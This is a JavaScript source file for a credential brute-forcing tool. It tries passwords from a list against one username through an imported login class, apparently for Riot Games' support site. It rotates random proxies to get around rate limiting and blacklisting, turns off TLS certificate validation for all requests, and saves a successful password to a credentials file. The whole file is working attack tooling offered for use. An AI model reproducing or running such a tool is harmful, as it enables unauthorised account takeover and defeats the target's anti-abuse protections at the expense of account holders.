import { Zendesk } from './riot/Zendesk.js';
import { HttpsProxyAgent } from 'https-proxy-agent';
import * as fs from 'fs';
import { AuthFailureError, LoginFailureError, RateLimitedError, SessionCookieError } from './errors/index.js';
import { Logger } from './util/Logger.js';
import config from './config.json' assert { type: 'json' };
import { readLines, sleep } from './util/funcs.js';
import * as Types from './typedef.js';

// Disable certificate validation
// because some proxies use self-signed certificates
// and node-fetch doesn't like that
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

/**
 * DO NOT EDIT BELOW THIS LINE
 */
const USERNAME = config.username;
let threads = 0;

const logger = Logger.getInstance();

// Read passlist
const passwords = readLines(config.pass_list_path);

// Read proxy list
let proxies;
if (config.use_proxy_list === true) {
  proxies = readLines(config.proxy_list_path);
}

let found = false;
let foundPassword = '';

function saveCredentialsAndExit() {
  try {
    fs.writeFileSync('./credentials.txt', `${USERNAME}:${foundPassword}`, {
      encoding: 'utf-8',
      flag: 'w',
    });
  } catch (err) {
    logger.error('Could not write password to file.');
  }
  process.exit(0);
}

function checkFound() {
  if (found) saveCredentialsAndExit();
}

async function doWork(password) {
  threads++;
  for (;;) {
    checkFound();

    /**
     * @type {Types.Proxy}
     */
    const proxy = {};
    let proxyAgent = null;
    if (proxies) {
      const proxyLine = proxies[Math.floor(Math.random() * proxies.length)];
      if (!proxyLine) continue;
      const split = proxyLine.split(':');

      proxy.host = split[0];
      proxy.port = split[1];

      // check if proxy has credentials
      if (split.length >= 4) {
        proxy.user = split[2];
        proxy.pass = split[3];
      }

      proxy.address = `${proxy.host}:${proxy.port}`;
      proxy.url =
        proxy.user && proxy.pass
          ? `http://${proxy.user}:${proxy.pass}@${proxy.host}:${proxy.port}`
          : `http://${proxy.host}:${proxy.port}`;
      proxyAgent = new HttpsProxyAgent(proxy.url);
    }

    logger.log(`Trying ${USERNAME}:${password}${proxy.host ? ' on Proxy ' + proxy.address : ''}`);

    try {
      const zendesk = new Zendesk(USERNAME, password, proxyAgent);
      await zendesk.login();
      logger.success(`Found credentials - ${USERNAME}:${password}`);
      found = true;
      foundPassword = password;
    } catch (err) {
      // password probably wrong, go to next password
      if (err instanceof AuthFailureError || err instanceof LoginFailureError) {
        logger.warn(`Password probably wrong - ${password}`);
        threads--;
        break;
      }

      // proxy rate limited, or blacklisted, try next proxy
      if (err instanceof RateLimitedError || err instanceof SessionCookieError) {
        logger.error(err);
        continue;
      }

      // request timed out, try next proxy
      if (err.name === 'AbortError') {
        logger.error('Request timed out');
        continue;
      }

      // most likely a proxy error, try next proxy
      logger.error(err);
      continue;
    }
    break;
  }
}

async function start() {
  logger.info('Starting...');
  logger.info('Max concurrent threads: ' + config.concurrent_threads);

  for (const password of passwords) {
    // check if threads are full and wait until one is free
    while (threads >= config.concurrent_threads) {
      await sleep(1000);
    }

    checkFound();
    if (!password) continue;
    logger.info(`Number of threads: ${threads}`);
    doWork(password);
    await sleep(500); // if you have thousands of proxies you might not even need this
  }
}
start();
